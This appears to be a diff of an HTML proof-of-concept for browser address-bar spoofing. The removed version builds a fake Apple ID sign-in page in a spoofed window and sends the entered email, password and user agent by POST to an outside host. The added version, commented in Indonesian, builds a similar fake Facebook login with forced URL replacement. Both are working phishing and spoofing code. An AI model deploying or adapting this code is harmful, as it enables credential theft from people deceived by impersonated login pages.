@@ -1,67 +1,69 @@
-<html>
-    <head>
-        <title>Address Bar Spoof - Apple Login</title>
-        <style>
-            body { margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%); height: 100vh; display: flex; align-items: center; justify-content: center; }
-            .container { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); width: 350px; text-align: center; }
-            .apple-logo { width: 40px; height: 48px; background: #000; border-radius: 6px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; font-size: 28px; color: white; font-weight: 600; }
-            h2 { color: #1d1d1f; margin: 0 0 30px; font-size: 24px; font-weight: 600; }
-            input { width: 100%; padding: 14px 16px; margin-bottom: 16px; border: 1px solid #d2d2d7; border-radius: 8px; font-size: 17px; box-sizing: border-box; }
-            input:focus { outline: none; border-color: #0071e3; box-shadow: 0 0 0 3px rgba(0,113,227,0.1); }
-            .login-btn { background: #0071e3; color: white; border: none; padding: 14px; border-radius: 8px; font-size: 17px; font-weight: 600; width: 100%; cursor: pointer; margin-top: 8px; }
-            .login-btn:hover { background: #0066cc; }
-            .footer { margin-top: 24px; font-size: 13px; color: #86868b; }
-        </style>
-    </head>
-    <body>
-        <script>
-            function demo() {
-                var evilPage = 'PGh0bWw+CjxzdHlsZT4KYm9keXsgYmFja2dyb3VuZDogI2Y1ZjdmYTt9Cjwvc3R5bGU+CjxkaXYgc3R5bGU9InBhZGRpbmc6IDUwcHg7Ij4KPGgzPkFkZHJlc3MgQmFyIFNwb29mIC0gQEFjMGQzRzMzazwvaD4+CjwvZGl2Pg==';
-                var x = window.open('','');
-                setInterval(function(){x.location.replace('https://www.apple.com/id/sign-in');}, 100);
-                x.document.write(atob(evilPage));
-                x.document.close();
-                
-                setTimeout(function() {
-                    var loginForm = `
-                        <div class="container">
-                            <div class="apple-logo">🍎</div>
-                            <h2>Sign in to your Apple ID</h2>
-                            <form id="loginForm" onsubmit="return false;">
-                                <input type="email" id="email" placeholder="Apple ID" required>
-                                <input type="password" id="password" placeholder="Password" required>
-                                <button type="submit" class="login-btn" onclick="stealCredentials();">Sign In</button>
-                            </form>
-                            <div class="footer">
-                                <a href="#" style="color: #0071e3; text-decoration: none;">Forgot Apple ID or password?</a>
-                            </div>
-                        </div>
-                    `;
-                    x.document.open();
-                    x.document.write(loginForm);
-                    x.document.close();
-                }, 500);
-            }
-            
-            function stealCredentials() {
-                var email = document.getElementById('email').value;
-                var password = document.getElementById('password').value;
-                
-                // Simulate credential theft (POST to attacker's server)
-                var formData = new FormData();
-                formData.append('email', email);
-                formData.append('password', password);
-                formData.append('userAgent', navigator.userAgent);
-                
-                fetch('https://0x403for.github.io/apple.html', {
-                    method: 'POST',
-                    body: formData
-                }).then(() => {
-                    alert('Login successful! Redirecting...');
-                    window.location.href = 'https://www.apple.com';
-                });
-            }
-        </script>
-        <button onclick="demo();" style="position: absolute; top: 20px; left: 20px; padding: 10px 20px; background: #ff4444; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: bold;">🧪 Test Attack</button>
-    </body>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>Address Bar Spoof Test</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding-top: 50px; background-color: #f4f4f4; }
+        .btn-test { padding: 15px 30px; font-size: 18px; cursor: pointer; border-radius: 8px; border: none; background: #1877f2; color: white; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+    <h2>Simulasi Kerentanan Spoofing</h2>
+    <p>Klik tombol di bawah untuk menguji respons browser terhadap manipulasi URL bar.</p>
+
+    <button class="btn-test" onclick="runDemo();">Test Spoofing</button>
+
+    <script>
+        function runDemo() {
+            // Konten HTML yang meniru tampilan di gambar Anda
+            var htmlContent = `
+                <html>
+                <head>
+                    <title>facebook.com</title>
+                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                    <style>
+                        body { font-family: "Times New Roman", serif; padding: 20px; background: white; }
+                        h2 { font-weight: normal; font-size: 24px; margin-bottom: 20px; }
+                        label { display: block; margin-top: 10px; font-size: 18px; }
+                        input { width: 100%; max-width: 300px; padding: 5px; border: 1px solid #767676; margin-top: 5px; }
+                        .header-mock { border-bottom: 1px solid #ccc; padding-bottom: 10px; margin-bottom: 20px; color: #555; font-family: sans-serif; font-size: 14px; text-align: center; }
+                    </style>
+                </head>
+                <body>
+                    <div class="header-mock">facebook.com</div>
+                    <h2>Fake Facebook login</h2>
+                    <label>email</label>
+                    <input type="text">
+                    <label>password</label>
+                    <input type="password">
+                </body>
+                </html>
+            `;
+
+            // Encode konten ke Base64 agar bisa diproses sebagai string tunggal
+            var encodedPage = btoa(htmlContent);
+
+            // Membuka jendela baru
+            var x = window.open('', '_blank', 'width=400,height=600');
+
+            // Eksekusi Spoofing: Mencoba mengganti URL secara paksa
+            // Catatan: Ini sering diblokir oleh sistem keamanan browser modern
+            var spoofInterval = setInterval(function() {
+                try {
+                    x.location.replace('https://www.facebook.com:8080');
+                } catch(e) {}
+            }, 5);
+
+            // Menulis konten palsu ke jendela yang baru dibuka
+            x.document.write(atob(encodedPage));
+
+            // Matikan interval setelah 3 detik untuk menghemat resource
+            setTimeout(function() {
+                clearInterval(spoofInterval);
+            }, 3000);
+        }
+    </script>
+</body>
 </html>
